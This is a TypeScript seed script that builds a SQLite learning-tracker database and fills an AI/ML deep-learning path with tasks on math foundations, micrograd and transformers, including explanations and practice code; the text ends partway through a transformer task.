import Database from 'better-sqlite3';
import { existsSync, mkdirSync } from 'fs';

const dbPath = './data/quest-log.db';

// Ensure data directory exists
if (!existsSync('./data')) {
	mkdirSync('./data', { recursive: true });
}

const db = new Database(dbPath);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

// Create tables
db.exec(`
	DROP TABLE IF EXISTS activity;
	DROP TABLE IF EXISTS tasks;
	DROP TABLE IF EXISTS modules;
	DROP TABLE IF EXISTS paths;

	CREATE TABLE paths (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		name TEXT NOT NULL,
		description TEXT,
		icon TEXT DEFAULT 'book',
		color TEXT DEFAULT 'emerald',
		language TEXT,
		skills TEXT,
		start_hint TEXT,
		difficulty TEXT DEFAULT 'intermediate',
		estimated_weeks INTEGER,
		schedule TEXT,
		created_at INTEGER
	);

	CREATE TABLE modules (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		path_id INTEGER NOT NULL REFERENCES paths(id) ON DELETE CASCADE,
		name TEXT NOT NULL,
		description TEXT,
		order_index INTEGER NOT NULL DEFAULT 0,
		target_date TEXT,
		created_at INTEGER
	);

	CREATE TABLE tasks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		module_id INTEGER NOT NULL REFERENCES modules(id) ON DELETE CASCADE,
		title TEXT NOT NULL,
		description TEXT,
		details TEXT,
		order_index INTEGER NOT NULL DEFAULT 0,
		completed INTEGER NOT NULL DEFAULT 0,
		completed_at INTEGER,
		notes TEXT,
		created_at INTEGER
	);

	CREATE TABLE activity (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		date TEXT NOT NULL UNIQUE,
		tasks_completed INTEGER NOT NULL DEFAULT 0
	);
`);

const insertPath = db.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// AI/ML Deep Learning Path
// ============================================================================
const aiPath = insertPath.run(
	'AI/ML Deep Learning',
	'Master transformers, LLMs, and generative AI from the ground up. Build your own models and understand the architecture behind modern AI.',
	'emerald',
	now
);

// Phase 0: Math Foundations
const aiMod0 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 0: Math Foundations',
	'Essential math for deep learning (1-2 weeks)',
	0,
	now
);

const mathTasks: [string, string, string][] = [
	['Watch 3Blue1Brown Essence of Linear Algebra',
	'Complete the 16-video YouTube playlist (~3hrs). Focus on chapters 1-7 covering vectors, linear combinations, and matrix transformations.',
	`## Learning Objectives
- Understand vectors as geometric objects and data structures
- Visualize matrices as transformations of space
- Build intuition for matrix multiplication as function composition

## Key Chapters to Focus On
1. **Vectors** - What even are they?
2. **Linear combinations, span, and basis** - Building blocks
3. **Linear transformations and matrices** - The core insight
4. **Matrix multiplication as composition** - Why it works this way
5. **Determinants** - How transformations scale space
6. **Inverse matrices** - Undoing transformations
7. **Dot products and duality** - Connecting algebra to geometry

## The Key Insight
Matrices are FUNCTIONS that transform space. When you multiply a matrix by a vector, you're applying a transformation. Every column of the matrix tells you where the basis vectors land.

## Why This Matters for Deep Learning
- Attention mechanisms are matrix multiplications
- Layer transformations are learned matrices
- Understanding shapes prevents debugging hell

## Resource
https://youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab

## Completion Criteria
- [ ] Watched all 16 videos
- [ ] Can explain what matrix multiplication represents geometrically
- [ ] Can predict output shape of matrix operations`],

	['Practice matrix multiplication by hand',
	'Do 5-10 multiplications on paper to internalize the shape rules and mechanics.',
	`## The Critical Rule
\`\`\`
(m × n) @ (n × p) = (m × p)
\`\`\`
Inner dimensions must match. Outer dimensions give result shape.

## Practice Exercises

### Exercise 1: Basic 2x3 @ 3x2
\`\`\`
A = [[1, 2, 3],    B = [[7, 8],
     [4, 5, 6]]         [9, 10],
                        [11, 12]]

Result shape: (2×3) @ (3×2) = (2×2)
\`\`\`
Calculate A @ B by hand.

### Exercise 2: Predict These Shapes
- (32, 512) @ (512, 768) = ?
- (8, 10, 64) @ (8, 64, 64) = ?
- (1, 768) @ (768, 50257) = ?

### Exercise 3: Transformer Shapes
In transformers you'll constantly see:
- \`(batch, seq_len, d_model)\` - Input tokens embedded
- \`(batch, heads, seq_len, d_k)\` - Multi-head attention
- \`(d_model, 4*d_model)\` - FFN expansion

Practice: If batch=8, seq_len=512, d_model=768, heads=12, d_k=64:
What's the shape of Q @ K.transpose(-2, -1)?

## Completion Criteria
- [ ] Completed 5+ hand calculations correctly
- [ ] Can quickly predict output shapes
- [ ] Understand batched matrix multiplication`],

	['Understand broadcasting in NumPy/PyTorch',
	'Learn the broadcasting rules that let you operate on tensors of different shapes.',
	`## The Three Broadcasting Rules
1. **Align shapes from the right** - Compare dimensions starting from the last
2. **Dimensions match if equal or one is 1** - Size 1 stretches to match
3. **Missing dimensions treated as 1** - Shorter shape gets prepended with 1s

## Examples

### Simple Case
\`\`\`python
(3, 4) + (4,)   # (4,) becomes (1, 4), broadcasts to (3, 4)
(3, 4) + (3, 1) # (3, 1) broadcasts column across 4 columns
\`\`\`

### Batch Operations
\`\`\`python
# Add bias to each batch element
(batch, features) + (features,)  # ✓ Works
(32, 768) + (768,)               # ✓ Adds same bias to all 32 samples
\`\`\`

### Common Transformer Pattern
\`\`\`python
# Attention mask: (batch, 1, 1, seq_len) broadcasts to (batch, heads, seq_len, seq_len)
mask = torch.ones(batch, 1, 1, seq_len)
attention_scores = torch.randn(batch, heads, seq_len, seq_len)
masked = attention_scores + mask  # Broadcasting!
\`\`\`

## Practice Exercise
\`\`\`python
import torch
a = torch.randn(2, 3, 4)
b = torch.randn(3, 1)
c = a + b  # What's the shape? Work it out before running!
\`\`\`

## Completion Criteria
- [ ] Can predict broadcast output shapes
- [ ] Understand when operations will fail
- [ ] Know how masks broadcast in attention`],

	['Learn transpose and reshape operations',
	'Master dimension manipulation: transpose, reshape, view, and permute.',
	`## Transpose
Swaps two dimensions. Essential for attention:
\`\`\`python
x = torch.randn(batch, seq, dim)  # (B, S, D)
x.transpose(1, 2)                  # (B, D, S)
\`\`\`

## Reshape vs View
\`\`\`python
x = torch.randn(2, 6)

# Reshape: may copy data
x.reshape(3, 4)  # (3, 4)
x.reshape(12)    # (12,)
x.reshape(-1)    # (12,) - infer size

# View: shares memory (requires contiguous)
x.view(3, 4)     # (3, 4) - same underlying data
\`\`\`

## Multi-Head Attention Reshape
The classic pattern:
\`\`\`python
# Start: (batch, seq_len, d_model)
# Want: (batch, heads, seq_len, d_k) where d_k = d_model // heads

batch, seq_len, d_model = 8, 512, 768
heads = 12
d_k = d_model // heads  # 64

x = torch.randn(batch, seq_len, d_model)

# Step 1: Split d_model into (heads, d_k)
x = x.view(batch, seq_len, heads, d_k)  # (8, 512, 12, 64)

# Step 2: Move heads before seq_len
x = x.transpose(1, 2)  # (8, 12, 512, 64)
\`\`\`

## Practice Exercise
\`\`\`python
x = torch.randn(2, 3, 4)
# Goal: shape (2, 12)
# How do you get there?

# Solution:
x.view(2, -1)  # or x.reshape(2, 12)
\`\`\`

## Completion Criteria
- [ ] Understand view vs reshape vs contiguous
- [ ] Can do multi-head attention reshaping
- [ ] Know when you need .contiguous()`],

	['Watch 3Blue1Brown Essence of Calculus',
	'Watch chapters 1-4 (~1hr) to build intuition for derivatives and gradients.',
	`## Key Concepts

### Derivative = Instantaneous Rate of Change
The slope of the tangent line at a point. How much does output change for tiny input change?

### What You Need to Know for Deep Learning
You do NOT need to compute derivatives by hand. PyTorch's autograd does this. But understand:
- If loss is high, the gradient tells you which direction makes it WORSE
- We go the OPPOSITE direction (gradient descent)
- Larger gradient = bigger adjustment needed

## Why This Matters
When you call \`loss.backward()\`, PyTorch computes gradients of the loss with respect to every parameter. These gradients tell the optimizer how to update weights.

\`\`\`python
loss = model(x, y)
loss.backward()  # Compute gradients

# Now every param has a .grad attribute
for param in model.parameters():
    print(param.grad.shape)  # Same shape as param
\`\`\`

## Resource
https://youtube.com/playlist?list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr

## Completion Criteria
- [ ] Watched chapters 1-4
- [ ] Can explain what a derivative represents
- [ ] Understand why gradients point toward steepest increase`],

	['Understand the chain rule conceptually',
	'Learn how derivatives compose—this IS backpropagation.',
	`## The Chain Rule
\`\`\`
d/dx[f(g(x))] = f'(g(x)) · g'(x)
\`\`\`

**In plain English:** "Derivative of the outer times derivative of the inner"

## Why This IS Backpropagation
Neural network: \`loss = L(output(weights))\`

To find how loss changes with weights:
1. How does loss change with output? → ∂L/∂output
2. How does output change with weights? → ∂output/∂weights
3. Multiply them: ∂L/∂weights = ∂L/∂output × ∂output/∂weights

## Example: Two-Layer Network
\`\`\`
input → [layer1] → hidden → [layer2] → output → [loss]

∂loss/∂layer1_weights = ∂loss/∂output
                       × ∂output/∂hidden
                       × ∂hidden/∂layer1_weights
\`\`\`

Each multiplication is the chain rule!

## What Autograd Does
PyTorch builds a computation graph as you compute forward:
\`\`\`python
y = x * w1  # Records: y depends on x, w1 via multiply
z = y + b   # Records: z depends on y, b via add
loss = z.mean()  # Records: loss depends on z via mean
\`\`\`

On \`loss.backward()\`, it walks backward through this graph, applying chain rule at each step.

## Completion Criteria
- [ ] Can explain chain rule in words
- [ ] Understand why it enables backpropagation
- [ ] Know that autograd handles this automatically`],

	['Learn what a gradient is',
	'Understand gradients as vectors pointing toward steepest increase.',
	`## Gradient = Vector of All Partial Derivatives

For a function f(x, y, z):
\`\`\`
∇f = [∂f/∂x, ∂f/∂y, ∂f/∂z]
\`\`\`

Each component says: "How much does f change if I nudge this variable?"

## Key Properties
- **Points toward steepest INCREASE** of the function
- **Magnitude** indicates how steep that increase is
- For loss minimization, we go the OPPOSITE direction

## In Neural Networks
\`\`\`python
# loss is a scalar, params is a vector of millions of weights
# gradient is same shape as params

loss.backward()

# Now for each parameter tensor:
param.grad  # Same shape as param!
            # Each element says how to change that weight
\`\`\`

## Gradient Descent Update
\`\`\`python
# The fundamental update rule:
param = param - learning_rate * param.grad

# If grad is positive → weight is making loss worse → decrease it
# If grad is negative → weight is helping → increase it
\`\`\`

## Visualizing in 2D
Imagine loss as a hilly landscape:
- You're standing at current weights
- Gradient points uphill
- You step opposite to gradient (downhill)
- Repeat until you reach a valley (local minimum)

## Completion Criteria
- [ ] Can explain what a gradient represents
- [ ] Understand why we subtract gradients in optimization
- [ ] Know that param.grad has same shape as param`],

	['Understand softmax function',
	'Learn how softmax converts logits to probabilities that sum to 1.',
	`## The Formula
\`\`\`
softmax(x_i) = exp(x_i) / Σ exp(x_j)
\`\`\`

## What It Does
- Takes any vector of numbers (called "logits")
- Outputs probabilities that sum to 1
- Larger input → larger probability
- Preserves relative ordering

## Example
\`\`\`python
logits = [2.0, 1.0, 0.1]
# exp: [7.39, 2.72, 1.11]
# sum: 11.22
# softmax: [0.659, 0.242, 0.099]  # Sums to 1.0
\`\`\`

## Why exp()?
- Makes all values positive (can't have negative probability)
- Amplifies differences (large gap in logits → more confident)
- Differentiable (needed for backprop)

## Temperature Scaling
\`\`\`python
softmax(x / T)  # T = temperature

# T < 1: More peaked (confident)
# T = 1: Standard softmax
# T > 1: More uniform (uncertain)
\`\`\`

Used in: sampling from language models, knowledge distillation

## Numerical Stability Trick
\`\`\`python
# Problem: exp(1000) = inf (overflow!)
# Solution: subtract max before exp

def softmax(x):
    x_max = np.max(x, axis=-1, keepdims=True)
    exp_x = np.exp(x - x_max)  # Now max value is exp(0) = 1
    return exp_x / np.sum(exp_x, axis=-1, keepdims=True)
\`\`\`

## Where It's Used
- **Attention weights:** Softmax over attention scores
- **Classification:** Final layer outputs class probabilities
- **Token prediction:** Next-token probabilities in LLMs

## Completion Criteria
- [ ] Can compute softmax by hand for small inputs
- [ ] Understand temperature scaling effects
- [ ] Know the numerical stability trick`],

	['Learn cross-entropy loss intuition',
	'Understand cross-entropy as a measure of prediction quality.',
	`## The Formula
\`\`\`
CE = -Σ y_true · log(y_pred)
\`\`\`

For classification (one-hot y_true):
\`\`\`
CE = -log(probability assigned to correct class)
\`\`\`

## Intuition: Surprise/Penalty
- **Confident and right:** Low loss (log of ~1 = ~0)
- **Confident and wrong:** HUGE loss (log of ~0 = very negative)
- **Uncertain:** Medium loss (log of 0.5 = -0.69)

## Example
\`\`\`python
# True label: class 1 (one-hot: [0, 1, 0])
# Prediction: [0.1, 0.8, 0.1] → CE = -log(0.8) = 0.22 ✓ Low loss
# Prediction: [0.8, 0.1, 0.1] → CE = -log(0.1) = 2.30 ✗ High loss
\`\`\`

## Why It Works for Training
- Forces model to be confident about correct answers
- Penalizes wrong confident predictions severely
- Gradient is proportional to (prediction - truth)

## In PyTorch
\`\`\`python
import torch.nn.functional as F

# Method 1: Separate softmax and log
probs = F.softmax(logits, dim=-1)
loss = F.nll_loss(torch.log(probs), targets)

# Method 2: Combined (more numerically stable)
loss = F.cross_entropy(logits, targets)  # Preferred!
\`\`\`

## Language Modeling
\`\`\`python
# For each position, predict next token
# Loss = average cross-entropy over all positions

logits = model(input_ids)  # (batch, seq_len, vocab_size)
targets = input_ids[:, 1:]  # Shifted by 1
loss = F.cross_entropy(logits[:, :-1].reshape(-1, vocab_size),
                       targets.reshape(-1))
\`\`\`

## Completion Criteria
- [ ] Can explain cross-entropy intuitively
- [ ] Understand why confident wrong predictions are heavily penalized
- [ ] Know to use F.cross_entropy in PyTorch`],

	['Understand KL divergence basics',
	'Learn how KL divergence measures the difference between distributions.',
	`## The Formula
\`\`\`
KL(P || Q) = Σ P(x) · log(P(x) / Q(x))
\`\`\`

## Intuition
"Extra bits needed to encode samples from P using a code optimized for Q"

If Q perfectly matches P → KL = 0
If Q is very different from P → KL is large

## Key Properties
- **NOT symmetric:** KL(P||Q) ≠ KL(Q||P)
- **Always ≥ 0**
- **Zero only when P = Q**

## Relationship to Cross-Entropy
\`\`\`
Cross-Entropy(P, Q) = Entropy(P) + KL(P || Q)
\`\`\`

Since Entropy(P) is constant, minimizing cross-entropy = minimizing KL divergence!

## Where It's Used in ML

### RLHF / Alignment
\`\`\`python
# Keep fine-tuned model close to reference
kl_penalty = kl_divergence(new_model_probs, reference_model_probs)
loss = reward - beta * kl_penalty
\`\`\`
Prevents model from drifting too far from original.

### VAEs (Variational Autoencoders)
\`\`\`python
# Regularize latent space to be Gaussian
kl_loss = KL(encoder_distribution || N(0, 1))
\`\`\`

### Knowledge Distillation
\`\`\`python
# Student learns from teacher's soft predictions
distill_loss = KL(student_probs || teacher_probs)
\`\`\`

## Completion Criteria
- [ ] Can explain KL divergence intuitively
- [ ] Know it's NOT symmetric
- [ ] Understand its role in RLHF and distillation`],

	['Study probability distributions',
	'Learn the key distributions used in deep learning.',
	`## Categorical Distribution
Discrete choices with specified probabilities.

\`\`\`python
# Token prediction: which of 50,000 tokens comes next?
probs = softmax(logits)  # [0.01, 0.005, 0.2, ...]
next_token = torch.multinomial(probs, num_samples=1)
\`\`\`

## Normal (Gaussian) Distribution
Continuous, bell-curve shaped.

\`\`\`python
# Weight initialization
weights = torch.randn(768, 768) * 0.02  # N(0, 0.02)

# VAE latent space
z = mean + std * torch.randn_like(std)  # Reparameterization trick

# torch.randn → N(0, 1) standard normal
\`\`\`

Parameters:
- **μ (mean):** Center of the distribution
- **σ (std):** Width/spread of the distribution

## Uniform Distribution
Equal probability over a range.

\`\`\`python
# Dropout mask: keep 90% of neurons
mask = torch.rand(hidden_size) > 0.1  # Uniform [0, 1)

# Random initialization in range
weights = torch.empty(768, 768).uniform_(-0.1, 0.1)
\`\`\`

## PyTorch Distributions Module
\`\`\`python
from torch.distributions import Normal, Categorical

# Sample from normal
dist = Normal(mean, std)
sample = dist.sample()
log_prob = dist.log_prob(sample)

# Sample from categorical
dist = Categorical(probs)
sample = dist.sample()
log_prob = dist.log_prob(sample)
\`\`\`

## Practical Exercise
\`\`\`python
import torch

# Sample 1000 values from N(0, 1)
samples = torch.randn(1000)
print(f"Mean: {samples.mean():.3f}")   # Should be ~0
print(f"Std: {samples.std():.3f}")     # Should be ~1
\`\`\`

## Completion Criteria
- [ ] Know Categorical for discrete choices
- [ ] Know Normal for continuous values
- [ ] Can sample from distributions in PyTorch`],

	['Implement softmax from scratch',
	'Write a numerically stable softmax implementation and test it.',
	`## Implementation
\`\`\`python
import numpy as np

def softmax(x):
    """Numerically stable softmax."""
    # Subtract max for numerical stability
    x_max = np.max(x, axis=-1, keepdims=True)
    exp_x = np.exp(x - x_max)
    return exp_x / np.sum(exp_x, axis=-1, keepdims=True)
\`\`\`

## Why Subtract Max?
\`\`\`python
# Without stability trick:
x = [1000, 1001, 1002]
np.exp(x)  # [inf, inf, inf] - overflow!

# With stability trick:
x_shifted = x - max(x)  # [-2, -1, 0]
np.exp(x_shifted)       # [0.135, 0.368, 1.0] - works!
\`\`\`

Subtracting max doesn't change the result (cancels in numerator/denominator).

## Test Cases
\`\`\`python
# Test 1: Basic functionality
result = softmax([1, 2, 3])
print(result)  # [0.09, 0.24, 0.67]
print(sum(result))  # 1.0

# Test 2: Verify sum = 1
assert np.allclose(softmax([1, 2, 3]).sum(), 1.0)

# Test 3: Large values don't overflow
result = softmax([1000, 1001, 1002])
assert not np.any(np.isnan(result))
assert not np.any(np.isinf(result))

# Test 4: Batch processing
batch = np.array([[1, 2, 3], [1, 1, 1]])
result = softmax(batch)
assert result.shape == (2, 3)
assert np.allclose(result.sum(axis=-1), [1.0, 1.0])
\`\`\`

## Add Temperature
\`\`\`python
def softmax_with_temperature(x, temperature=1.0):
    x_scaled = x / temperature
    x_max = np.max(x_scaled, axis=-1, keepdims=True)
    exp_x = np.exp(x_scaled - x_max)
    return exp_x / np.sum(exp_x, axis=-1, keepdims=True)

# Test temperature effects
logits = [1, 2, 3]
print(softmax_with_temperature(logits, T=0.5))  # More peaked
print(softmax_with_temperature(logits, T=1.0))  # Standard
print(softmax_with_temperature(logits, T=2.0))  # More uniform
\`\`\`

## Completion Criteria
- [ ] Implemented numerically stable softmax
- [ ] All test cases pass
- [ ] Added temperature parameter
- [ ] Tested with various inputs including edge cases`]
];

mathTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod0.lastInsertRowid, title, desc, details, i, now);
});

// Phase 1: Foundations
const aiMod1 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 1: Neural Net Foundations',
	'Build understanding of neural networks and autograd (1-2 weeks)',
	1,
	now
);

const foundationTasks: [string, string, string][] = [
	['Watch 3Blue1Brown Neural Networks playlist',
	'Watch the 4-video series (~1hr) on neural network fundamentals.',
	`## Videos Overview
1. **But what is a neural network?** - Visual explanation of layers and neurons
2. **Gradient descent** - How training works
3. **Backpropagation** - How gradients flow backward
4. **Backpropagation calculus** - The math underneath

## Key Insights
- Neural net = layers of simple functions composed together
- Each neuron: weighted sum → activation function
- Training = adjusting weights to minimize loss
- Gradient descent = take small steps downhill

## Watch For
- The visualization of how each layer transforms data
- Why non-linear activations matter
- How gradients propagate backward through layers

## Resource
https://youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi

## Completion Criteria
- [ ] Watched all 4 videos
- [ ] Can explain what a neural network computes
- [ ] Understand gradient descent visually`],

	['Clone and study micrograd',
	"Study Karpathy's micrograd - a tiny autograd engine in ~100 lines of Python.",
	`## Setup
\`\`\`bash
git clone https://github.com/karpathy/micrograd
cd micrograd
\`\`\`

## Study Order
1. **micrograd/engine.py** - The entire autograd engine

### Key Components to Understand

#### The Value Class
\`\`\`python
class Value:
    def __init__(self, data, _children=(), _op=''):
        self.data = data
        self.grad = 0
        self._backward = lambda: None
        self._prev = set(_children)
        self._op = _op
\`\`\`

#### Operations Build a Graph
\`\`\`python
def __add__(self, other):
    out = Value(self.data + other.data, (self, other), '+')
    def _backward():
        self.grad += out.grad
        other.grad += out.grad
    out._backward = _backward
    return out
\`\`\`

#### backward() Traverses It
\`\`\`python
def backward(self):
    # Topological sort
    topo = []
    visited = set()
    def build_topo(v):
        if v not in visited:
            visited.add(v)
            for child in v._prev:
                build_topo(child)
            topo.append(v)
    build_topo(self)

    # Go backwards, apply chain rule
    self.grad = 1
    for v in reversed(topo):
        v._backward()
\`\`\`

## Key Insight
This is ALL autograd is:
1. Track which operations were performed
2. For each operation, know how to compute gradients
3. Walk backward through the graph applying chain rule

## Completion Criteria
- [ ] Can explain how Value tracks computation
- [ ] Understand how _backward closures work
- [ ] Know how topological sort enables backprop`],

	['Reimplement micrograd from memory',
	'Build your own autograd engine without looking at the reference.',
	`## The Challenge
Close the micrograd repo. Open a blank Python file. Build it yourself.

## Step-by-Step Guide

### Step 1: Basic Value Class
\`\`\`python
class Value:
    def __init__(self, data, _children=(), _op=''):
        self.data = data
        self.grad = 0.0
        self._backward = lambda: None
        self._prev = set(_children)
        self._op = _op

    def __repr__(self):
        return f"Value(data={self.data}, grad={self.grad})"
\`\`\`

### Step 2: Add Operations
\`\`\`python
    def __add__(self, other):
        other = other if isinstance(other, Value) else Value(other)
        out = Value(self.data + other.data, (self, other), '+')

        def _backward():
            self.grad += out.grad
            other.grad += out.grad
        out._backward = _backward
        return out

    def __mul__(self, other):
        other = other if isinstance(other, Value) else Value(other)
        out = Value(self.data * other.data, (self, other), '*')

        def _backward():
            self.grad += other.data * out.grad
            other.grad += self.data * out.grad
        out._backward = _backward
        return out
\`\`\`

### Step 3: Implement backward()
\`\`\`python
    def backward(self):
        # Build topological order
        topo = []
        visited = set()
        def build_topo(v):
            if v not in visited:
                visited.add(v)
                for child in v._prev:
                    build_topo(child)
                topo.append(v)
        build_topo(self)

        # Backprop
        self.grad = 1.0
        for v in reversed(topo):
            v._backward()
\`\`\`

### Step 4: Test It
\`\`\`python
a = Value(2.0)
b = Value(3.0)
c = a * b + a  # c = 2*3 + 2 = 8
c.backward()
print(f"a.grad = {a.grad}")  # Should be 4.0 (3 + 1)
print(f"b.grad = {b.grad}")  # Should be 2.0
\`\`\`

## Debugging Tips
- If gradients are wrong, print the computation graph
- Compare your gradients to PyTorch's
- Make sure you're accumulating gradients (+=, not =)

## Completion Criteria
- [ ] Built Value class from scratch
- [ ] Implemented add, mul, and backward
- [ ] Verified gradients match expected values`],

	['Watch Karpathy makemore Part 1-2',
	'Code along with the makemore series to build character-level language models.',
	`## Part 1: Bigram Language Model (~1hr)
https://youtube.com/watch?v=PaCmpygFfXo

### What You'll Build
The simplest possible language model: predict next character based only on current character.

### Key Concepts
- Character encoding: map 'a' → 0, 'b' → 1, etc.
- Counting: how often does 'b' follow 'a'?
- Probability: counts → probabilities via normalization

### Code Along
\`\`\`python
# Build count matrix
N = torch.zeros(27, 27, dtype=torch.int32)
for word in words:
    for ch1, ch2 in zip(word, word[1:]):
        N[ch1_idx, ch2_idx] += 1

# Convert to probabilities
P = N.float()
P = P / P.sum(dim=1, keepdim=True)
\`\`\`

## Part 2: MLP Language Model (~1hr)
https://youtube.com/watch?v=TCH_1BHY58I

### What You'll Build
Bengio-style neural language model with embeddings.

### Key Concepts
- **Character embeddings:** Learnable vectors for each character
- **Context window:** Look at N previous characters
- **Hidden layer:** Non-linear transformation
- **Output layer:** Predict next character

### Architecture
\`\`\`python
# Embedding lookup
C = torch.randn(27, embed_dim)  # Learnable!
emb = C[input_chars]  # (batch, context_len, embed_dim)

# Hidden layer
h = torch.tanh(emb.view(-1, context_len * embed_dim) @ W1 + b1)

# Output layer
logits = h @ W2 + b2  # (batch, vocab_size)
\`\`\`

## Completion Criteria
- [ ] Built bigram model, generated text
- [ ] Built MLP model, achieved lower loss than bigram
- [ ] Understand embeddings and why they work`],

	['Watch Karpathy makemore Part 3-4',
	'Deep dive into BatchNorm and manual backpropagation.',
	`## Part 3: BatchNorm (~1hr)
https://youtube.com/watch?v=P6sfmUTpUmc

### The Problem
As networks get deeper, activations either:
- Explode (→ inf)
- Vanish (→ 0)

### The Solution: Batch Normalization
\`\`\`python
# For each feature, normalize across batch
mean = x.mean(dim=0)
var = x.var(dim=0)
x_norm = (x - mean) / torch.sqrt(var + eps)

# Learnable scale and shift
out = gamma * x_norm + beta
\`\`\`

### What You'll Learn
- Why activations blow up without normalization
- How BatchNorm keeps activations "healthy"
- Dead neurons and how to detect them
- Analyzing activation statistics

## Part 4: Manual Backprop (~1hr)
https://youtube.com/watch?v=q8SA3rM6ckI

### The Exercise
Compute gradients BY HAND through the entire network.

### Why This Matters
This is where you REALLY understand what PyTorch does automatically.

### What You'll Compute
\`\`\`python
# Forward pass (you implement)
logits = forward(x)
loss = cross_entropy(logits, targets)

# Backward pass (compute by hand!)
dlogits = ...  # Start here
dW2 = ...
db2 = ...
dh = ...
# ... all the way back to embeddings
\`\`\`

### Key Insight
Every backward step is just the chain rule applied to that operation.

## Completion Criteria
- [ ] Implemented BatchNorm, understand why it works
- [ ] Computed gradients manually through full network
- [ ] Verified manual gradients match autograd`],

	['Read The Little Book of Deep Learning',
	'Read this concise 150-page overview of deep learning foundations.',
	`## About the Book
- **Author:** François Fleuret
- **Length:** ~150 pages with excellent figures
- **URL:** https://fleuret.org/francois/lbdl.html
- **Cost:** Free PDF

## Reading Strategy

### Session 1: Foundations
- Chapter 1: Machine learning basics
- Chapter 2: Efficient computation (tensors, GPUs)
- Chapter 3: Training (loss, optimization)

### Session 2: Architectures
- Chapter 4: Model components (linear, activations, normalization)
- Chapter 5: Architectures (MLPs, CNNs, attention)

### Session 3: Advanced Topics
- Chapter 6: Training tricks
- Chapter 7: Generative models
- Chapter 8: Applications

## What to Focus On
- Architecture diagrams - study them carefully
- Intuitive explanations - skip heavy proofs
- Practical considerations - what works in practice

## What to Skip
- Mathematical proofs (unless you're interested)
- Sections on topics you'll cover later in depth

## Use as Reference
Keep this book handy. It's a great refresher when you encounter concepts later.

## Completion Criteria
- [ ] Read chapters 1-5 thoroughly
- [ ] Skimmed chapters 6-8
- [ ] Understand core architectures from diagrams`],

	['Complete micrograd exercises',
	'Extend your micrograd implementation with new operations and build an MLP.',
	`## Exercise 1: Add Subtraction
\`\`\`python
def __sub__(self, other):
    return self + (-other)

def __neg__(self):
    return self * -1
\`\`\`

## Exercise 2: Add Division
\`\`\`python
def __truediv__(self, other):
    return self * other**-1

def __pow__(self, other):
    # other must be int/float, not Value
    out = Value(self.data ** other, (self,), f'**{other}')
    def _backward():
        self.grad += other * (self.data ** (other - 1)) * out.grad
    out._backward = _backward
    return out
\`\`\`

## Exercise 3: Add ReLU
\`\`\`python
def relu(self):
    out = Value(max(0, self.data), (self,), 'ReLU')
    def _backward():
        self.grad += (out.data > 0) * out.grad
    out._backward = _backward
    return out
\`\`\`

## Exercise 4: Add exp() and log()
\`\`\`python
import math

def exp(self):
    out = Value(math.exp(self.data), (self,), 'exp')
    def _backward():
        self.grad += out.data * out.grad
    out._backward = _backward
    return out
\`\`\`

## Exercise 5: Build 2-Layer MLP
\`\`\`python
class Neuron:
    def __init__(self, nin):
        self.w = [Value(random.uniform(-1, 1)) for _ in range(nin)]
        self.b = Value(0)

    def __call__(self, x):
        act = sum((wi * xi for wi, xi in zip(self.w, x)), self.b)
        return act.relu()

    def parameters(self):
        return self.w + [self.b]

class MLP:
    def __init__(self, nin, nouts):
        sz = [nin] + nouts
        self.layers = [Layer(sz[i], sz[i+1]) for i in range(len(nouts))]

    def __call__(self, x):
        for layer in self.layers:
            x = layer(x)
        return x
\`\`\`

## Exercise 6: Train on XOR
\`\`\`python
# XOR data
xs = [[0, 0], [0, 1], [1, 0], [1, 1]]
ys = [0, 1, 1, 0]

# Train loop
model = MLP(2, [4, 1])
for i in range(1000):
    # Forward
    preds = [model(x)[0] for x in xs]
    loss = sum((p - y)**2 for p, y in zip(preds, ys))

    # Backward
    for p in model.parameters():
        p.grad = 0
    loss.backward()

    # Update
    for p in model.parameters():
        p.data -= 0.1 * p.grad
\`\`\`

## Completion Criteria
- [ ] Subtraction and division work
- [ ] ReLU activation implemented
- [ ] exp() and log() work
- [ ] MLP class trains on XOR successfully`]
];

foundationTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod1.lastInsertRowid, title, desc, details, i, now);
});

// Phase 2: Transformers
const aiMod2 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 2: Transformers',
	'Deep dive into transformer architecture (2-3 weeks)',
	2,
	now
);

const transformerTasks: [string, string, string][] = [
	['Read "The Illustrated Transformer"',
	'Study Jay Alammar\'s visual guide to transformer architecture (30-60 min read).',
	`## Resource
https://jalammar.github.io/illustrated-transformer

## Key Diagrams to Study

### 1. Q/K/V Projections
- Input is projected into three vectors: Query, Key, Value
- Attention = how much should each position attend to others

### 2. Attention Score Calculation
\`\`\`
Attention(Q, K, V) = softmax(QK^T / sqrt(d_k)) V
\`\`\`

### 3. Multi-Head Attention
- Multiple "heads" attend to different aspects
- Heads concatenated and projected back

### 4. Full Transformer Block
\`\`\`
x = x + MultiHeadAttention(LayerNorm(x))
x = x + FeedForward(LayerNorm(x))
\`\`\`

## Exercise: Draw It Yourself
After reading, close the browser and draw:
1. A single attention head with Q, K, V
2. How heads combine in multi-head attention
3. A full transformer block with residuals

## Follow-up Reading
- "The Illustrated GPT-2" (same site)
- "The Illustrated BERT" (same site)

## Completion Criteria
- [ ] Read the full article
- [ ] Drew the architecture from memory
- [ ] Understand Q, K, V roles`],

	['Watch "Let\'s build GPT from scratch"',
	'Code along with Karpathy\'s 2-hour video building GPT from scratch.',
	`## Resource
https://youtube.com/watch?v=kCc8FmEb1nY

## Setup
\`\`\`bash
# Create new notebook
jupyter notebook
# Or use Google Colab for free GPU
\`\`\`

## What You'll Build
